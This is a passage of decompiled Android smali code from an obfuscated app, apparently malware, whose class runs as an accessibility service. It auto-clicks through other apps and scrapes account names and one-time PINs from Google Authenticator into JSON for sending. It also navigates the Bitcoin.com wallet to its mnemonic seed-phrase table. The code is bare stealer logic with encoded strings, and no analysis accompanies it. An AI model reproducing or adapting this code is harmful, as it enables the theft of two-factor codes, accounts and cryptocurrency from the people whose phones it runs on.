    .line 8
    sget-object p1, Lb0/b;->I:Lj0/b;

    check-cast p1, Lj0/e;

    invoke-virtual {p1}, Lj0/e;->a()Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Ljava/util/Set;

    .line 9
    invoke-interface {p1}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_f
    :goto_6
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1b

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_10

    goto :goto_6

    :cond_10
    invoke-virtual {v1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-nez v0, :cond_11

    goto :goto_6

    :cond_11
    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_12
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_13

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    move-object v2, v1

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v2

    if-eqz v2, :cond_12

    goto :goto_7

    :cond_13
    move-object v1, v8

    :goto_7
    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v1, :cond_14

    goto :goto_6

    :cond_14
    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 10
    sget-object v0, Lb0/b;->K:Lj0/b;

    check-cast v0, Lj0/e;

    invoke-virtual {v0}, Lj0/e;->a()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Set;

    .line 11
    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_8
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_f

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_15

    goto :goto_8

    :cond_15
    invoke-virtual {v2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-nez v1, :cond_16

    goto :goto_8

    :cond_16
    invoke-static {v1}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v1, :cond_17

    goto :goto_8

    :cond_17
    invoke-virtual {p0, v1, v6}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    goto :goto_8

    :cond_18
    :goto_9
    invoke-static {}, Ls0/c;->m()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1b

    invoke-static {}, Ls0/c;->l()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1b

    goto :goto_c

    :cond_19
    :goto_a
    invoke-static {}, Ls0/c;->m()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1b

    invoke-static {}, Ls0/c;->l()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1b

    goto :goto_c

    :cond_1a
    :goto_b
    invoke-static {}, Ls0/c;->m()Ljava/lang/String;

    move-result-object p1

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1b

    invoke-static {}, Ls0/c;->l()Ljava/lang/String;

    move-result-object p1

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1b

    :goto_c
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_d

    :catchall_0
    move-exception p1

    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_1b
    :goto_d
    return v4
.end method

.method public final L()Z
    .locals 6

    const-string v0, ""

    const/4 v1, 0x0

    .line 1
    :try_start_0
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "autoClickOnce"

    invoke-interface {v2, v3, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_0

    move-object v2, v0

    .line 2
    :cond_0
    const-string v3, "1"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    sget-object v2, Lb0/b;->a:Lb0/b;

    .line 3
    sget-object v2, Lb0/b;->F:Lj0/b;

    check-cast v2, Lj0/e;

    invoke-virtual {v2}, Lj0/e;->a()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/util/Set;

    .line 4
    invoke-interface {v2}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_6

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_1

    goto :goto_0

    :cond_1
    invoke-virtual {v4, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_2

    goto :goto_0

    :cond_2
    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_3
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_4

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    move-object v5, v4

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v5

    if-eqz v5, :cond_3

    goto :goto_1

    :cond_4
    const/4 v4, 0x0

    :goto_1
    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v4, :cond_5

    goto :goto_0

    .line 5
    :cond_5
    invoke-virtual {p0, v4, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 6
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "autoClickOnce"

    invoke-interface {v2, v3, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v0, 0x1

    return v0

    :catchall_0
    move-exception v0

    .line 7
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_6
    return v1
.end method

.method public final M()V
    .locals 25

    move-object/from16 v1, p0

    const-string v2, ":id/custom"

    const-string v3, "it.parent"

    const-string v4, ":id/content"

    const-string v5, ":id/miRefresh"

    const-string v6, "number_"

    const-string v7, ":id/recycler_view"

    const-string v8, "it.parent.parent"

    const-string v9, "word_"

    const-string v10, "aVYxMkpnaXBsd0tzMU95aTZVSk16dz09OjpVcnJIeWg3U3E1U1FURERZS2lENjBBPT0="

    const-string v11, "SDdEeDJMaHhWYWZPb0FScFozakRWZz09Ojo0V0QrdUNtZkxMUk04RmM3Q0dhbDVRPT0="

    const-string v12, "obj.toString()"

    const/4 v15, 0x2

    :try_start_0
    iget-object v14, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    sget-object v16, Lb0/b;->a:Lb0/b;

    invoke-virtual/range {v16 .. v16}, Lb0/b;->b()Ljava/lang/String;

    move-result-object v13
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_4

    move-object/from16 v16, v2

    const/4 v2, 0x0

    :try_start_1
    invoke-static {v14, v13, v2, v15}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v13

    if-eqz v13, :cond_4

    const-string v2, "authenticator2"

    .line 1
    sget-object v13, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_3

    if-nez v13, :cond_0

    :try_start_2
    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    const/4 v14, 0x0

    invoke-virtual {v1, v13, v14}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v13

    sput-object v13, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    move-object v2, v0

    move-object/from16 v19, v3

    move-object/from16 v18, v7

    goto/16 :goto_5

    :cond_0
    :goto_0
    :try_start_3
    sget-object v13, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v13}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v14, 0x0

    invoke-interface {v13, v2, v14}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_4

    .line 2
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    const-string v14, "com.google.android.apps.authenticator2:id/user_row_drag_handle"

    invoke-virtual {v13, v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v13

    if-nez v13, :cond_2

    :cond_1
    move-object/from16 v19, v3

    move-object/from16 v18, v7

    goto :goto_3

    :cond_2
    invoke-interface {v13}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v13

    const/4 v14, 0x0

    :goto_1
    invoke-interface {v13}, Ljava/util/Iterator;->hasNext()Z

    move-result v17

    if-eqz v17, :cond_1

    invoke-interface {v13}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v17

    move-object/from16 v15, v17

    check-cast v15, Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_3

    move-object/from16 v18, v7

    move-object/from16 v17, v13

    const/4 v13, 0x0

    :try_start_4
    invoke-virtual {v15, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    invoke-virtual {v7, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    const/4 v13, 0x1

    invoke-virtual {v15, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v15

    const/4 v13, 0x0

    invoke-virtual {v15, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v15

    invoke-virtual {v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v13

    const-string v15, "user_"
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    move-object/from16 v19, v3

    :try_start_5
    invoke-static {v14}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v15, v3}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "pin_"

    invoke-static {v14}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-static {v3, v7}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    add-int/lit8 v14, v14, 0x1

    move-object/from16 v13, v17

    move-object/from16 v7, v18

    move-object/from16 v3, v19

    const/4 v15, 0x2

    goto :goto_1

    :catchall_1
    move-exception v0

    move-object/from16 v19, v3

    :goto_2
    move-object v2, v0

    goto :goto_5

    :goto_3
    invoke-virtual {v2}, Lorg/json/JSONObject;->length()I

    move-result v3

    if-lez v3, :cond_5

    sget-object v3, Lc0/b;->a:Lc0/b;

    const-string v7, "com.goolge.android.apps.authenticator2"

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v13, "googleauth"

    invoke-virtual {v3, v1, v7, v2, v13}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "authenticator2"

    const-string v3, "1"

    .line 3
    sget-object v7, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v7, :cond_3

    invoke-static {v11}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const/4 v13, 0x0

    invoke-virtual {v1, v7, v13}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v7

    sput-object v7, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_3
    sget-object v7, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v7}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v7}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v7

    invoke-interface {v7, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v7}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 4
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    goto :goto_6

    :catchall_2
    move-exception v0

    goto :goto_2

    :catchall_3
    move-exception v0

    :goto_4
    move-object/from16 v19, v3

    move-object/from16 v18, v7

    goto :goto_2

    :cond_4
    move-object/from16 v19, v3

    move-object/from16 v18, v7

    goto :goto_6

    :catchall_4
    move-exception v0

    move-object/from16 v16, v2

    goto :goto_4

    :goto_5
    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_5
    :goto_6
    :try_start_6
    iget-object v7, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    sget-object v13, Lb0/b;->a:Lb0/b;

    invoke-virtual {v13}, Lb0/b;->e()Ljava/lang/String;

    move-result-object v13

    const/4 v14, 0x2

    const/4 v15, 0x0

    invoke-static {v7, v13, v15, v14}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v7

    if-eqz v7, :cond_30

    const-string v7, "bitcoincom"

    .line 5
    sget-object v13, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_9

    if-nez v13, :cond_6

    :try_start_7
    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    const/4 v14, 0x0

    invoke-virtual {v1, v13, v14}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v13

    sput-object v13, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_5

    goto :goto_7

    :catchall_5
    move-exception v0

    move-object v7, v0

    goto/16 :goto_d

    :cond_6
    :goto_7
    :try_start_8
    sget-object v13, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v13}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v14, 0x0

    invoke-interface {v13, v7, v14}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    if-nez v7, :cond_30

    .line 6
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_7

    goto :goto_9

    :cond_7
    const-string v13, "com.bitcoin.mwallet:id/nav_settings"

    invoke-virtual {v7, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_8

    goto :goto_9

    :cond_8
    invoke-interface {v7}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v7

    :cond_9
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    move-result v13
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_9

    if-eqz v13, :cond_a

    :try_start_9
    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v13

    move-object v14, v13

    check-cast v14, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v14
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_5

    if-eqz v14, :cond_9

    goto :goto_8

    :cond_a
    const/4 v13, 0x0

    :goto_8
    :try_start_a
    check-cast v13, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v13, :cond_b

    goto :goto_9

    :cond_b
    const/4 v7, 0x2

    const/4 v14, 0x0

    invoke-static {v1, v13, v14, v7}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_9
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_c

    goto :goto_a

    :cond_c
    const-string v13, "com.bitcoin.mwallet:id/setting_base_layout"

    invoke-virtual {v7, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_d

    goto :goto_a

    :cond_d
    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v7, :cond_e

    goto :goto_a

    :cond_e
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    invoke-static {v7, v8}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v13, 0x2

    const/4 v14, 0x0

    invoke-static {v1, v7, v14, v13}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_a
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_f

    goto :goto_b

    :cond_f
    const-string v13, "com.bitcoin.mwallet:id/setting_base_layout"

    invoke-virtual {v7, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_10

    goto :goto_b

    :cond_10
    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v7, :cond_11

    goto :goto_b

    :cond_11
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    invoke-static {v7, v8}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v13, 0x2

    const/4 v14, 0x0

    invoke-static {v1, v7, v14, v13}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_b
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    iget-boolean v13, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->c:Z
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_9

    const-string v14, "it.text"

    if-nez v13, :cond_20

    :try_start_b
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    if-nez v13, :cond_12

    goto :goto_f

    :cond_12
    const-string v15, "MVMxTnlDSTJBdlV1L3VWcEYyT0UvUCtpdHo4WGNuMDh3aCtsdXE5eVZySHZMbmtuY2xsclpMR0QwM1lDQzh2dTo6anRUcC9uRGZzVDZzLzMxQVBLMG5NUT09"

    const-string v15, "com.bitcoin.mwallet:id/walletName"

    invoke-virtual {v13, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v13

    if-nez v13, :cond_13

    goto :goto_f

    :cond_13
    invoke-interface {v13}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v13

    :goto_c
    invoke-interface {v13}, Ljava/util/Iterator;->hasNext()Z

    move-result v15
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_9

    if-eqz v15, :cond_15

    :try_start_c
    invoke-interface {v13}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v15

    move-object/from16 v17, v15

    check-cast v17, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual/range {v17 .. v17}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-static {v2, v14}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v3, "BTC"

    move-object/from16 v17, v13

    move-object/from16 v20, v15

    const/4 v13, 0x2

    const/4 v15, 0x0

    invoke-static {v2, v3, v15, v13}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v2
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_5

    if-eqz v2, :cond_14

    goto :goto_e

    :cond_14
    move-object/from16 v13, v17

    goto :goto_c

    :goto_d
    move-object/from16 v21, v4

    move-object/from16 v22, v5

    move-object/from16 v24, v6

    goto/16 :goto_22

    :cond_15
    const/16 v20, 0x0

    :goto_e
    :try_start_d
    check-cast v20, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v20, :cond_16

    :goto_f
    goto/16 :goto_19

    :cond_16
    invoke-virtual/range {v20 .. v20}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-static {v2, v8}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v3, 0x2

    const/4 v13, 0x0

    invoke-static {v1, v2, v13, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_9

    move-object v13, v4

    const-wide/16 v3, 0x96

    :try_start_e
    invoke-virtual {v2, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_17

    goto :goto_10

    :cond_17
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_10
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_19

    :cond_18
    :goto_11
    move-object/from16 v22, v5

    move-object/from16 v24, v6

    move-object/from16 v21, v13

    goto/16 :goto_17

    :cond_19
    const-string v3, "com.bitcoin.mwallet:id/mnemonicTable"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_1a

    goto :goto_11

    :cond_1a
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_1b

    goto :goto_11

    :cond_1b
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-lez v3, :cond_18

    const/4 v4, 0x0

    const/4 v15, 0x0

    :goto_12
    move/from16 v17, v4

    add-int/lit8 v4, v15, 0x1

    invoke-virtual {v2, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v15

    move-object/from16 v20, v2

    invoke-virtual {v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_7

    if-lez v2, :cond_1d

    move-object/from16 v21, v13

    const/4 v13, 0x0

    :goto_13
    move-object/from16 v22, v5

    add-int/lit8 v5, v13, 0x1

    :try_start_f
    invoke-virtual {v15, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    move-object/from16 v23, v15

    const/4 v15, 0x0

